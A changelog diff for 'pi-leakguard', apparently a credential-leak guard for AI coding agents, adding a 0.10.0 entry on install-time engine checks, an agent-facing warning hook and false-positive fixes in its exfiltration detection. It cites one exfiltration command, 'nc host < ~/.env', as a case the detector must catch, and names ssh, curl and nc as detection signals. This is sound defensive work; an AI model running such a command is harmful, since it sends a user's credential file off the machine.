@@ -2,6 +2,44 @@
 
 All notable changes to `pi-leakguard` are documented here.
 
+## [0.10.0] - 2026-10-26
+
+### Added
+
+- **`scripts/ensure-engine.sh`**, wired as the npm `prepare` script. A missing
+  detection engine is now offered at install time, with an explicit yes, instead
+  of surfacing later as a degraded gate or a blocked commit. It never prompts
+  without a TTY, never downloads without consent, and always exits 0 so a
+  warning cannot look like a broken package.
+- **Engine state reaches the model, not just the human.** A
+  `before_agent_start` hook (pi) and `experimental.chat.system.transform`
+  (OpenCode) inject one line when the engine is absent or drifted. `ui.notify`
+  draws on a status bar that an agent never reads; without this an agent can
+  spend a turn believing credential detection is armed when the binary is gone.
+  Nothing is injected in a healthy session.
+- `docs/engine-install-policy.md` records why install asks and update does not.
+
+### Fixed — three false positives from real work, not invented cases
+
+All three blocked legitimate commands while shipping 0.9.x. Each is now a test,
+with the genuine case asserted next to it so a fix cannot quietly open a hole.
+
+| was blocked | why it was wrong |
+|---|---|
+| a CHANGELOG documenting `Authorization: <opaque>` | the header NAME was prose; the value is what leaves the machine |
+| a heredoc whose text mentioned `ssh`, `curl` and `export` | the tool names matched as words, and `export` alone was treated as exfiltration |
+| `cat > file <<'EOF'` | not a network operation, but `nc` matched inside the text |
+
+The exfil check now requires a real **invocation** (command position, after a
+separator or `sudo`), and `set`/`export` alone is no longer exfiltration —
+a credential key or an env dump must be present.
+
+Removing the loose `\benv\b` branch did open a real hole: `nc host < ~/.env`
+stopped being caught. The replacement is `SENSITIVE_PATH_RE`, which recognises a
+path to a credential store as sensitive material on its own. Asserted both ways.
+
+Suite: 140 -> 146.
+
 ## [0.9.1] - 2026-10-26
 
 ### Added
